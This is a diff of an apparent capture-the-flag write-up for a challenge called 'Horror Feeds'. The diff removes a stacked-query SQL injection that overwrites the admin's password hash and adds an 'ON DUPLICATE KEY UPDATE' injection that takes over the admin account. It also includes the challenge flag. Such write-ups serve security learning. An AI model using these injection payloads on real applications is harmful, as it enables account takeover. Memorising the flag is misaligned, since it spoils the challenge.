@@ -1,7 +1,7 @@
 # CTFname - Horror Feeds
 
 * **Category:** Category
-* **Points:** 100
+* **Points:** 200
 
 ## Challenge
 
@@ -71,11 +71,21 @@ UPDATE users SET password='$2b$12$/SM/o3oxLx.rpLNtBrhrkOCXxK/myFjO7DsE83Xws95RSy
 
 ![image](https://user-images.githubusercontent.com/78451563/198297003-93da0bb4-28e2-44d0-ac93-3ca2bbede074.png)
 
-
-### Final Payload:
-```sql
-test","test"); UPDATE users SET password='$2b$12$/SM/o3oxLx.rpLNtBrhrkOCXxK/myFjO7DsE83Xws95RSy8j8mjN6' WHERE username='admin'; COMMIT;-- -
+* While this does update the admin's password we get this error `Commands out of sync; you can't run this command now` meaning:
 ```
+If you get Commands out of sync; you can’t run this command now in your client code, you are calling client functions in the wrong order.
+```
+* To resolve this error i used the `ON DUPLICATE KEY UPDATE` query.
+```sql
+admin","test") ON DUPLICATE KEY UPDATE username='admin',password='$2b$12$XFj7IPgUFo4kI06hG9H5jOpoRPH3N5xqwF.tWdyefOJwiUOR6KCfa'-- -
+```
+
+![image](https://user-images.githubusercontent.com/78451563/198306235-edbda84e-9564-461e-8102-e1da3745d3b8.png)
+
+![image](https://user-images.githubusercontent.com/78451563/198306332-3b666681-382d-40b3-b736-8dd644feb4a1.png)
+
+
+ [Payload Query Reference](https://chartio.com/resources/tutorials/how-to-insert-if-row-does-not-exist-upsert-in-mysql/)
 
 ```
 Flag: HTB{N3ST3D_QU3R1E5_AR3_5CARY!!!}
